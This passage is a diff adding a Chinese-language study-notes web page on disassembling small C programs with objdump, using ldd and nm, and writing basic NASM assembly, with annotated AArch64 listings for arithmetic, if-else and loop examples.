+ 664:	mov	x3, #0x0                   	// #0
+ 668:	mov	x4, #0x0                   	// #0
+ 66c:	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	bl	620 &lt;abort@plt&gt;
+
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 678:	ldr	x0, [x0, #4072]
+ 67c:	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	ret
+ 688:	nop
+ 68c:	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	add	x0, x0, #0x10
+ 698:	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	add	x1, x1, #0x10
+ 6a0:	cmp	x1, x0
+ 6a4:	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	adrp	x1, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6ac:	ldr	x1, [x1, #4056]
+ 6b0:	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	mov	x16, x1
+ 6b8:	br	x16
+ 6bc:	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	add	x0, x0, #0x10
+ 6c8:	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	add	x1, x1, #0x10
+ 6d0:	sub	x1, x1, x0
+ 6d4:	lsr	x2, x1, #63
+ 6d8:	add	x1, x2, x1, asr #3
+ 6dc:	asr	x1, x1, #1
+ 6e0:	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	adrp	x2, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 6e8:	ldr	x2, [x2, #4088]
+ 6ec:	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	mov	x16, x2
+ 6f4:	br	x16
+ 6f8:	ret
+ 6fc:	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	stp	x29, x30, [sp, #-32]!
+ 704:	mov	x29, sp
+ 708:	str	x19, [sp, #16]
+ 70c:	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	ldrb	w0, [x19, #16]
+ 714:	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	adrp	x0, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 71c:	ldr	x0, [x0, #4064]
+ 720:	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	ldr	x0, [x0, #8]
+ 72c:	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	mov	w0, #0x1                   	// #1
+ 738:	strb	w0, [x19, #16]
+ 73c:	ldr	x19, [sp, #16]
+ 740:	ldp	x29, x30, [sp], #32
+ 744:	ret
+ 748:	nop
+ 74c:	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;main&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	stp	x29, x30, [sp, #-16]!
+ 758:	mov	x29, sp
+   printf(&quot;Wu YiHung\n&quot;);
+ 75c:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 760:	add	x0, x0, #0x790
+ 764:	bl	630 &lt;puts@plt&gt;
+   return 0;
+ 768:	mov	w0, #0x0                   	// #0
+&#125;
+ 76c:	ldp	x29, x30, [sp], #16
+ 770:	ret
+</code></pre>
+</li>
+<li>不顯示機器指令 &#x3D;&#x3D;&gt; –no-show-raw-insn</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="範例2"><a href="#範例2" class="headerlink" title="範例2"></a>範例2</h3><ul>
+<li>原始碼 PLAYGROUND.c<pre><code class="c++">//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int f(int x, int y)&#123;
+  int sum = 0;
+  sum += x;
+  sum += y;
+  return sum;
+&#125;
+int main()&#123;
+  int a = 128, b = 64;
+  printf(&quot;%d\n&quot;,f(a, b));
+  return 0;
+&#125;
+</code></pre>
+</li>
+<li>編譯 <code>gcc -o PLAYGROUND PLAYGROUND.c -g</code></li>
+<li>反編譯(使用intel格式) &#x3D;&#x3D;&gt; <code>objdump -D -M intel PLAYGROUND</code><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/yih-0118/ProgSec/blob/05261f54d4b97292ab5e00a3b7fd3bdc0a5d48c2/2-4_objdump_1.md">結果</a></li>
+</ul>
+</li>
+<li>反編譯(使用intel格式+ 只要執行區段.text) &#x3D;&#x3D;&gt; <code>objdump -D -M intel -j .text PLAYGROUND</code><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/yih-0118/ProgSec/blob/b1c2caf3faf44407e52fa20381cc156c33cf7301/2-4_objdump_2.md">結果</a></li>
+</ul>
+</li>
+<li>反編譯 &#x3D;&#x3D;&gt; <code>objdump -D -M intel -j .text PLAYGROUND --no-show-raw-insn</code><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/yih-0118/ProgSec/blob/48d9f6017d51d3ce53f4f33bf4a03afd051c97e6/2-4_objdump_3.md">結果</a></li>
+</ul>
+</li>
+<li>反編譯 &#x3D;&#x3D;&gt; <code>objdump -S -M intel -j .text PLAYGROUND --no-show-raw-insn</code><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/yih-0118/ProgSec/blob/bd280f4fd86cfb8a099602025e49d17c8fd308ba/2-4_objdump_4.md">結果</a><pre><code class="c++">PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .text:
+
+0000000000000640 &lt;_start&gt;:
+ 640:	objdump: unrecognised disassembler option: intel
+nop
+ 644:	mov	x29, #0x0                   	// #0
+ 648:	mov	x30, #0x0                   	// #0
+ 64c:	mov	x5, x0
+ 650:	ldr	x1, [sp]
+ 654:	add	x2, sp, #0x8
+ 658:	mov	x6, sp
+ 65c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf708&gt;
+ 660:	ldr	x0, [x0, #4080]
+ 664:	mov	x3, #0x0                   	// #0
+ 668:	mov	x4, #0x0                   	// #0
+ 66c:	bl	5f0 &lt;__libc_start_main@plt&gt;
+ 670:	bl	620 &lt;abort@plt&gt;
+
+0000000000000674 &lt;call_weak_fn&gt;:
+ 674:	adrp	x0, 10000 &lt;__FRAME_END__+0xf708&gt;
+ 678:	ldr	x0, [x0, #4072]
+ 67c:	cbz	x0, 684 &lt;call_weak_fn+0x10&gt;
+ 680:	b	610 &lt;__gmon_start__@plt&gt;
+ 684:	ret
+ 688:	nop
+ 68c:	nop
+
+0000000000000690 &lt;deregister_tm_clones&gt;:
+ 690:	adrp	x0, 11000 &lt;__data_start&gt;
+ 694:	add	x0, x0, #0x10
+ 698:	adrp	x1, 11000 &lt;__data_start&gt;
+ 69c:	add	x1, x1, #0x10
+ 6a0:	cmp	x1, x0
+ 6a4:	b.eq	6bc &lt;deregister_tm_clones+0x2c&gt;  // b.none
+ 6a8:	adrp	x1, 10000 &lt;__FRAME_END__+0xf708&gt;
+ 6ac:	ldr	x1, [x1, #4056]
+ 6b0:	cbz	x1, 6bc &lt;deregister_tm_clones+0x2c&gt;
+ 6b4:	mov	x16, x1
+ 6b8:	br	x16
+ 6bc:	ret
+
+00000000000006c0 &lt;register_tm_clones&gt;:
+ 6c0:	adrp	x0, 11000 &lt;__data_start&gt;
+ 6c4:	add	x0, x0, #0x10
+ 6c8:	adrp	x1, 11000 &lt;__data_start&gt;
+ 6cc:	add	x1, x1, #0x10
+ 6d0:	sub	x1, x1, x0
+ 6d4:	lsr	x2, x1, #63
+ 6d8:	add	x1, x2, x1, asr #3
+ 6dc:	asr	x1, x1, #1
+ 6e0:	cbz	x1, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6e4:	adrp	x2, 10000 &lt;__FRAME_END__+0xf708&gt;
+ 6e8:	ldr	x2, [x2, #4088]
+ 6ec:	cbz	x2, 6f8 &lt;register_tm_clones+0x38&gt;
+ 6f0:	mov	x16, x2
+ 6f4:	br	x16
+ 6f8:	ret
+ 6fc:	nop
+
+0000000000000700 &lt;__do_global_dtors_aux&gt;:
+ 700:	stp	x29, x30, [sp, #-32]!
+ 704:	mov	x29, sp
+ 708:	str	x19, [sp, #16]
+ 70c:	adrp	x19, 11000 &lt;__data_start&gt;
+ 710:	ldrb	w0, [x19, #16]
+ 714:	cbnz	w0, 73c &lt;__do_global_dtors_aux+0x3c&gt;
+ 718:	adrp	x0, 10000 &lt;__FRAME_END__+0xf708&gt;
+ 71c:	ldr	x0, [x0, #4064]
+ 720:	cbz	x0, 730 &lt;__do_global_dtors_aux+0x30&gt;
+ 724:	adrp	x0, 11000 &lt;__data_start&gt;
+ 728:	ldr	x0, [x0, #8]
+ 72c:	bl	600 &lt;__cxa_finalize@plt&gt;
+ 730:	bl	690 &lt;deregister_tm_clones&gt;
+ 734:	mov	w0, #0x1                   	// #1
+ 738:	strb	w0, [x19, #16]
+ 73c:	ldr	x19, [sp, #16]
+ 740:	ldp	x29, x30, [sp], #32
+ 744:	ret
+ 748:	nop
+ 74c:	nop
+
+0000000000000750 &lt;frame_dummy&gt;:
+ 750:	b	6c0 &lt;register_tm_clones&gt;
+
+0000000000000754 &lt;f&gt;:
+//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int f(int x, int y)&#123;
+ 754:	sub	sp, sp, #0x20
+ 758:	str	w0, [sp, #12]
+ 75c:	str	w1, [sp, #8]
+  int sum = 0;
+ 760:	str	wzr, [sp, #28]
+  sum += x;
+ 764:	ldr	w1, [sp, #28]
+ 768:	ldr	w0, [sp, #12]
+ 76c:	add	w0, w1, w0
+ 770:	str	w0, [sp, #28]
+  sum += y;
+ 774:	ldr	w1, [sp, #28]
+ 778:	ldr	w0, [sp, #8]
+ 77c:	add	w0, w1, w0
+ 780:	str	w0, [sp, #28]
+  return sum;
+ 784:	ldr	w0, [sp, #28]
+&#125;
+ 788:	add	sp, sp, #0x20
+ 78c:	ret
+
+0000000000000790 &lt;main&gt;:
+int main()&#123;
+ 790:	stp	x29, x30, [sp, #-32]!
+ 794:	mov	x29, sp
+  int a = 128, b = 64;
+ 798:	mov	w0, #0x80                  	// #128
+ 79c:	str	w0, [sp, #24]
+ 7a0:	mov	w0, #0x40                  	// #64
+ 7a4:	str	w0, [sp, #28]
+  printf(&quot;%d\n&quot;,f(a, b));
+ 7a8:	ldr	w1, [sp, #28]
+ 7ac:	ldr	w0, [sp, #24]
+ 7b0:	bl	754 &lt;f&gt;
+ 7b4:	mov	w1, w0
+ 7b8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 7bc:	add	x0, x0, #0x7f0
+ 7c0:	bl	630 &lt;printf@plt&gt;
+  return 0;
+ 7c4:	mov	w0, #0x0                   	// #0
+&#125;
+ 7c8:	ldp	x29, x30, [sp], #32
+ 7cc:	ret
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Linux-執行檔分析常用工具"><a href="#Linux-執行檔分析常用工具" class="headerlink" title="Linux 執行檔分析常用工具"></a>Linux 執行檔分析常用工具</h1><h2 id="ldd-指令"><a href="#ldd-指令" class="headerlink" title="ldd 指令"></a>ldd 指令</h2><ul>
+<li>用途 - 列出動態相依關係。</li>
+<li>語法 <code>ldd FileName</code></li>
+<li>示範<img src="https://hackmd.io/_uploads/SJObaIwqp.png" alt="image"></li>
+</ul>
+<h2 id="nm-指令"><a href="#nm-指令" class="headerlink" title="nm 指令"></a>nm 指令</h2><ul>
+<li>列出目標檔案(.o)的符號清單<img src="https://hackmd.io/_uploads/rJbuZvv56.png" alt="image"></li>
+<li>查到的解釋意義&#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/nm.html">出處</a><pre><code>-a或–debug-syms：顯示所有的符號，包括debugger-only symbols。
+-B：等同–formatxtbsd，用來相容MIPS的nm。
+-C或–demangle：將低階符號名稱解析(demangle)成使用者級名字。 這樣可以使得C++函數名具有可讀性。
+–no-demangle：預設的選項，不需要將低階符號名稱解析成使用者級名。
+-D或–dynamic：顯示動態符號。 該任選項僅對於動態目標(例如特定類型的共享庫)有意義。
+-f format：使用format格式輸出。 format可以選取bsd、sysv或posix，該選項在GNU的nm中有用。 預設為bsd。
+-g或–extern-only：僅顯示外部符號。
+-n、-v或–numeric-sort：依符號對應位址的順序排序，而非按符號名稱的字元順序。
+-p或–no-sort：依目標檔案中遇到的符號順序顯示，不排序。
+-P或–portability：使用POSIX.2標準輸出格式取代預設的輸出格式。 等同於使用任選項-f posix。
+-s或–print-armap：當列出庫中成員的符號時，包含索引。 索引的內容包含：哪些模組包含哪些名字的對應。
+-r或–reverse-sort：反轉排序的順序(例如，升序變成降序)。
+–size-sort：依大小排列符號順序。 該大小是按照一個符號的值與它下一個符號的值進行計算的。
+–targetxtbfdname：指定一個目標代碼的格式，而非使用系統的預設格式。
+-u或–undefined-only：僅顯示沒有定義的符號(那些外部符號)。
+–defined-only:僅顯示定義的符號。
+-l或–line-numbers：對每個符號，使用偵錯資訊來試圖找到檔案名稱和行號。
+-V或–version：顯示nm的版本號碼。
+–help：顯示nm的選項。
+</code></pre>
+</li>
+</ul>
+<hr>
+<h1 id="計算機結構與組合程式"><a href="#計算機結構與組合程式" class="headerlink" title="計算機結構與組合程式"></a>計算機結構與組合程式</h1><ul>
+<li>1.機器碼(machine code| instruction set)與組合程式(assembly program)</li>
+<li>2.計算機結構主題</li>
+<li>3.組合語言與程式</li>
+</ul>
+<h2 id="線上反組譯服務-連結"><a href="#線上反組譯服務-連結" class="headerlink" title="線上反組譯服務 &#x3D;&#x3D;&gt; 連結"></a>線上反組譯服務 &#x3D;&#x3D;&gt; <a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm">連結</a></h2><ul>
+<li>測試範例: 55 8b ec 機器碼的組合語言為何?</li>
+<li>結果<img src="https://hackmd.io/_uploads/SyOOQPP5a.png" alt="image"></li>
+</ul>
+<hr>
+<h1 id="NASM-Netwide-Assembler-組合程式設計"><a href="#NASM-Netwide-Assembler-組合程式設計" class="headerlink" title="NASM(Netwide Assembler)組合程式設計"></a>NASM(Netwide Assembler)組合程式設計</h1><h2 id="NASM-Netwide-Assembler"><a href="#NASM-Netwide-Assembler" class="headerlink" title="NASM(Netwide Assembler)"></a>NASM(Netwide Assembler)</h2><ul>
+<li>官方文件 <a target="_blank" rel="noopener" href="https://www.nasm.us/xdoc/2.15/html/">https://www.nasm.us/xdoc/2.15/html/</a><br><a target="_blank" rel="noopener" href="https://github.com/MyFirstSecurity2020/ProgSec/blob/main/3-3.md#nasm%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%831%E7%B7%9A%E4%B8%8A%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%83"> </a>NASM開發環境1:線上開發環境</li>
+</ul>
+<hr>
+<ul>
+<li>myCompiler(64位元) <a target="_blank" rel="noopener" href="https://www.mycompiler.io/new/asm-x86_64">https://www.mycompiler.io/new/asm-x86_64</a></li>
+</ul>
+<h2 id="nasm程式範例"><a href="#nasm程式範例" class="headerlink" title="nasm程式範例"></a>nasm程式範例</h2><ul>
+<li>範例:費式序列:列印出90個費式序列<ul>
+<li>資料來源:[<a target="_blank" rel="noopener" href="https://cs.lmu.edu/~ray/notes/nasmtutorial/]">https://cs.lmu.edu/~ray/notes/nasmtutorial/]</a><br>  <img src="https://hackmd.io/_uploads/HkgY8d_96.png" alt="image"></li>
+<li><code>nasm -f elf64 PLAYGROUND.asm</code></li>
+<li><code>gcc -o PLAYGROUND PLAYGROUND.o -no-pie</code></li>
+<li><code>./PLAYGROUND</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="32位元NASM與64位元NASM比較"><a href="#32位元NASM與64位元NASM比較" class="headerlink" title="32位元NASM與64位元NASM比較"></a>32位元NASM與64位元NASM比較</h2><ul>
+<li>原程式</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+int main()&#123;
+  printf(&quot;Yi-Hung Wu&quot;);
+  return 0;
+&#125;             
+</code></pre>
+<ul>
+<li>32位元NASM</li>
+</ul>
+<pre><code class="txt">section .data
+    msg db &quot;Yi-Hung Wu&quot;, 0
+
+section .text
+    global _start
+
+_start:
+    ; Call C library function to print the string
+    push msg
+    call printf
+
+    ; Exit the program
+    mov eax, 0       ; Return 0 status
+    mov ebx, 0x1     ; Exit syscall number
+    int 0x80         ; Call kernel
+</code></pre>
+<ul>
+<li>64位元NASM</li>
+</ul>
+<pre><code class="txt">section .data
+    message db &quot;Yi-Hung Wu&quot;, 10
+    len equ $ - message
+
+section .text
+    global _start
+
+_start:
+    mov     rax, 1          
+    mov     rdi, 1          
+    mov     rsi, message    
+    mov     rdx, len       
+    syscall             
+
+    mov     rax, 60         
+    xor     rdi, rdi       
+    syscall
+</code></pre>
+<h3 id="相互比較與說明"><a href="#相互比較與說明" class="headerlink" title="相互比較與說明"></a>相互比較與說明</h3><ol>
+<li>圈出不同之處<img src="https://hackmd.io/_uploads/Hyits5pnp.png" alt="image"></li>
+<li><img src="https://hackmd.io/_uploads/Hk-y3qp26.png" alt="image"></li>
+</ol>
+<h2 id="教材導讀"><a href="#教材導讀" class="headerlink" title="教材導讀"></a>教材導讀</h2><ul>
+<li><p>GITHUB &#x3D;&#x3D;&gt; <a target="_blank" rel="noopener" href="https://github.com/Apress/beginning-x64-assembly-programming/tree/master">https://github.com/Apress/beginning-x64-assembly-programming/tree/master</a> </p>
+</li>
+<li><p>git clone <a target="_blank" rel="noopener" href="https://github.com/Apress/beginning-x64-assembly-programming.git">https://github.com/Apress/beginning-x64-assembly-programming.git</a> <img src="https://hackmd.io/_uploads/HyVGYdP9p.png" alt="image"></p>
+</li>
+<li><p>結果<br>  <img src="https://hackmd.io/_uploads/Bkqov__q6.png" alt="image"></p>
+</li>
+</ul>
+<h3 id="Chapter-01"><a href="#Chapter-01" class="headerlink" title="Chapter 01"></a>Chapter 01</h3><ul>
+<li>組譯後並運行執行檔<img src="https://hackmd.io/_uploads/B1_JKCD9p.png" alt="image"></li>
+</ul>
+<hr>
+<h1 id="C-vs-Assembly"><a href="#C-vs-Assembly" class="headerlink" title="C vs Assembly"></a>C vs Assembly</h1><ul>
+<li>C 程式編譯成執行檔 &#x3D;&#x3D; &gt; <ul>
+<li><code>gcc PLAYGROUND.c -o PLAYGROUND -g</code></li>
+</ul>
+</li>
+<li>將執行檔逆向成組合語言 &#x3D;&#x3D; &gt; <ul>
+<li><code>objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="範例一（計算與先後）"><a href="#範例一（計算與先後）" class="headerlink" title="範例一（計算與先後）"></a>範例一（計算與先後）</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include &lt;stdio.h&gt;
+int main()&#123;
+  int x = 11203, y = 21004;
+  printf(&quot;%d&quot;, (x++) + (++y));
+  return 0;
+&#125;
+</code></pre>
+<ul>
+<li><p>編譯與執行結果<img src="https://hackmd.io/_uploads/SkotCqP5a.png" alt="image"></p>
+</li>
+<li><p>assembly</p>
+</li>
+</ul>
+<pre><code class="c++">0000000000000754 &lt;main&gt;:
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 754:	stp	x29, x30, [sp, #-32]!  
+ 758:	mov	x29, sp               
+
+
+  int x = 11203, y = 21004;
+ 75c:	mov	w0, #0x2bc3            // 把11203 放到 w0
+ 760:	str	w0, [sp, #24]          // 在[sp+24]儲存 w0 (11203)
+ 764:	mov	w0, #0x520c            // 把21004 放到 w0
+ 768:	str	w0, [sp, #28]          // 在[sp+28]儲存w0 (21004)
+
+  printf(&quot;%d&quot;, (x++) + (++y));
+ 76c:	ldr	w0, [sp, #24]          // 從[sp+24]輸入x的值到 w0
+ 770:	add	w1, w0, #0x1           // 將x增加1，結果儲存到w1
+ 774:	str	w1, [sp, #24]          // 在[sp+24]儲存x的更新值
+ 778:	ldr	w1, [sp, #28]          // 從[sp+28]輸入y的值到w1
+ 77c:	add	w1, w1, #0x1           // 將y增加1，結果儲存到w1
+ 780:	str	w1, [sp, #28]          // 在[sp+28]儲存y的更新值
+ 784:	ldr	w1, [sp, #28]          //輸入更新後的y到w1
+ 788:	add	w0, w0, w1            // 將更新後的x和y相加，結果儲存到w0
+ 78c:	mov	w1, w0                // 將結果複製到w1
+ 790:	adrp	x0, 0 &lt;__abi_tag-0x278&gt; 
+ 794:	add	x0, x0, #0x7c8        
+ 798:	bl	630 &lt;printf@plt&gt;      
+
+  // 返回 0 ，就是停止
+  return 0;
+ 79c:	mov	w0, #0x0                // 將 0輸入寄存器 w0
+&#125;
+ 7a0:	ldp	x29, x30, [sp], #32     
+ 7a4:	ret                          
+</code></pre>
+<h2 id="範例二（if-else）"><a href="#範例二（if-else）" class="headerlink" title="範例二（if-else）"></a>範例二（if-else）</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">#include&lt;stdio.h&gt;
+int main()&#123;
+   int num;
+   printf(&quot;Please enter a positive integer:&quot;);
+   scanf(&quot;%d&quot;,&amp;num);
+   if (num%2==0)&#123;
+     printf(&quot;The number you entered is an even number.&quot;);
+   &#125;
+   else&#123;
+     printf(&quot;The number you entered is an odd number.&quot;);
+   &#125;
+&#125;
+</code></pre>
+<ul>
+<li>編譯與執行結果<img src="https://hackmd.io/_uploads/Byak6hw5a.png" alt="image"></li>
+<li>assembly</li>
+</ul>
+<pre><code class="c++">0000000000000894 &lt;main&gt;:
+#include&lt;stdio.h&gt;
+int main()&#123;
+ 894:	stp	x29, x30, [sp, #-32]!
+ 898:	mov	x29, sp
+ 89c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf540&gt;
+ 8a0:	ldr	x0, [x0, #4072]
+ 8a4:	ldr	x1, [x0]
+ 8a8:	str	x1, [sp, #24]
+ 8ac:	mov	x1, #0x0                   	// #0
+   int num;
+   printf(&quot;Please enter a positive integer:&quot;);
+ 8b0:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8b4:	add	x0, x0, #0x950
+ 8b8:	bl	750 &lt;printf@plt&gt;
+   scanf(&quot;%d&quot;,&amp;num);
+ 8bc:	add	x0, sp, #0x14
+ 8c0:	mov	x1, x0
+ 8c4:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8c8:	add	x0, x0, #0x978
+ 8cc:	bl	740 &lt;__isoc99_scanf@plt&gt;
+   if (num%2==0)&#123;
+ 8d0:	ldr	w0, [sp, #20]
+ 8d4:	and	w0, w0, #0x1
+ 8d8:	cmp	w0, #0x0
+ 8dc:	b.ne	8f0 &lt;main+0x5c&gt;  // b.any
+     printf(&quot;The number you entered is an even number.&quot;);
+ 8e0:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8e4:	add	x0, x0, #0x980
+ 8e8:	bl	750 &lt;printf@plt&gt;
+ 8ec:	b	8fc &lt;main+0x68&gt;
+   &#125;
+   else&#123;
+     printf(&quot;The number you entered is an odd number.&quot;);
+ 8f0:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8f4:	add	x0, x0, #0x9b0
+ 8f8:	bl	750 &lt;printf@plt&gt;
+ 8fc:	mov	w0, #0x0                   	// #0
+ 900:	mov	w1, w0
+   &#125;
+&#125;
+ 904:	adrp	x0, 10000 &lt;__FRAME_END__+0xf540&gt;
+ 908:	ldr	x0, [x0, #4072]
+ 90c:	ldr	x3, [sp, #24]
+ 910:	ldr	x2, [x0]
+ 914:	subs	x3, x3, x2
+ 918:	mov	x2, #0x0                   	// #0
+ 91c:	b.eq	924 &lt;main+0x90&gt;  // b.none
+ 920:	bl	710 &lt;__stack_chk_fail@plt&gt;
+ 924:	mov	w0, w1
+ 928:	ldp	x29, x30, [sp], #32
+ 92c:	ret
+</code></pre>
+<h2 id="範例三（LOOP）"><a href="#範例三（LOOP）" class="headerlink" title="範例三（LOOP）"></a>範例三（LOOP）</h2><ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">//FOR LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+   int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設 
+   printf(&quot;Enter a positive integer: &quot;);
+   scanf(&quot;%d&quot;, &amp;n);
+   for (i = 1; i &lt;= n; ++i)&#123;
+       sum *= i;
+   &#125;
+   printf(&quot;Sum = %d&quot;, sum);
+   return 0;
+&#125;
+</code></pre>
+<ul>
+<li>編譯與執行結果<img src="https://hackmd.io/_uploads/rJ5KJpDca.png" alt="image"><br><img src="https://hackmd.io/_uploads/Hkl0kaw9p.png" alt="image"></li>
+<li>assembly</li>
+</ul>
+<pre><code class="c++">0000000000000894 &lt;main&gt;:
+//FOR LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 894:	stp	x29, x30, [sp, #-48]!
+ 898:	mov	x29, sp
+ 89c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 8a0:	ldr	x0, [x0, #4072]
+ 8a4:	ldr	x1, [x0]
+ 8a8:	str	x1, [sp, #40]
+ 8ac:	mov	x1, #0x0                   	// #0
+   int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設
+ 8b0:	mov	w0, #0x1                   	// #1
+ 8b4:	str	w0, [sp, #36]
+   printf(&quot;Enter a positive integer: &quot;);
+ 8b8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8bc:	add	x0, x0, #0x970
+ 8c0:	bl	750 &lt;printf@plt&gt;
+   scanf(&quot;%d&quot;, &amp;n);
+ 8c4:	add	x0, sp, #0x1c
+ 8c8:	mov	x1, x0
+ 8cc:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8d0:	add	x0, x0, #0x990
+ 8d4:	bl	740 &lt;__isoc99_scanf@plt&gt;
+   for (i = 1; i &lt;= n; ++i)&#123;
+ 8d8:	mov	w0, #0x1                   	// #1
+ 8dc:	str	w0, [sp, #32]
+ 8e0:	b	900 &lt;main+0x6c&gt;
+       sum *= i;
+ 8e4:	ldr	w1, [sp, #36]
+ 8e8:	ldr	w0, [sp, #32]
+ 8ec:	mul	w0, w1, w0
+ 8f0:	str	w0, [sp, #36]
+   for (i = 1; i &lt;= n; ++i)&#123;
+ 8f4:	ldr	w0, [sp, #32]
+ 8f8:	add	w0, w0, #0x1
+ 8fc:	str	w0, [sp, #32]
+ 900:	ldr	w0, [sp, #28]
+ 904:	ldr	w1, [sp, #32]
+ 908:	cmp	w1, w0
+ 90c:	b.le	8e4 &lt;main+0x50&gt;
+   &#125;
+   printf(&quot;Sum = %d&quot;, sum);
+ 910:	ldr	w1, [sp, #36]
+ 914:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 918:	add	x0, x0, #0x998
+ 91c:	bl	750 &lt;printf@plt&gt;
+   return 0;
+ 920:	mov	w0, #0x0                   	// #0
+&#125;
+ 924:	mov	w1, w0
+ 928:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 92c:	ldr	x0, [x0, #4072]
+ 930:	ldr	x3, [sp, #40]
+ 934:	ldr	x2, [x0]
+ 938:	subs	x3, x3, x2
+ 93c:	mov	x2, #0x0                   	// #0
+ 940:	b.eq	948 &lt;main+0xb4&gt;  // b.none
+ 944:	bl	710 &lt;__stack_chk_fail@plt&gt;
+ 948:	mov	w0, w1
+ 94c:	ldp	x29, x30, [sp], #48
+ 950:	ret
+</code></pre>
+<ul>
+<li>c</li>
+</ul>
+<pre><code class="c++">//WHILE LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+   int n, i, sum = 1;
+   printf(&quot;Enter a positive integer: &quot;);
+   scanf(&quot;%d&quot;, &amp;n);
+   i = 1;
+   while (i &lt;= n)&#123;
+       sum *= i;
+       ++i;
+   &#125;
+   printf(&quot;Sum = %d&quot;, sum);
+   return 0;
+&#125;
+</code></pre>
+<ul>
+<li>編譯與執行結果<img src="https://hackmd.io/_uploads/Sk7ogpv96.png" alt="image"><img src="https://hackmd.io/_uploads/HkRk-pDc6.png" alt="image"><ul>
+<li>assembly</li>
+</ul>
+</li>
+</ul>
+<pre><code class="c++">0000000000000894 &lt;main&gt;:
+//WHILE LOOP
+#include &lt;stdio.h&gt;
+int main()&#123;
+ 894:	stp	x29, x30, [sp, #-48]!
+ 898:	mov	x29, sp
+ 89c:	adrp	x0, 10000 &lt;__FRAME_END__+0xf578&gt;
+ 8a0:	ldr	x0, [x0, #4072]
+ 8a4:	ldr	x1, [x0]
+ 8a8:	str	x1, [sp, #40]
+ 8ac:	mov	x1, #0x0                   	// #0
+   int n, i, sum = 1;
+ 8b0:	mov	w0, #0x1                   	// #1
+ 8b4:	str	w0, [sp, #36]
+   printf(&quot;Enter a positive integer: &quot;);
+ 8b8:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8bc:	add	x0, x0, #0x970
+ 8c0:	bl	750 &lt;printf@plt&gt;
+   scanf(&quot;%d&quot;, &amp;n);
+ 8c4:	add	x0, sp, #0x1c
+ 8c8:	mov	x1, x0
+ 8cc:	adrp	x0, 0 &lt;__abi_tag-0x278&gt;
+ 8d0:	add	x0, x0, #0x990
+ 8d4:	bl	740 &lt;__isoc99_scanf@plt&gt;
+   i = 1;
+ 8d8:	mov	w0, #0x1                   	// #1
+ 8dc:	str	w0, [sp, #32]
+   while (i &lt;= n)&#123;
+ 8e0:	b	900 &lt;main+0x6c&gt;
+       sum *= i;
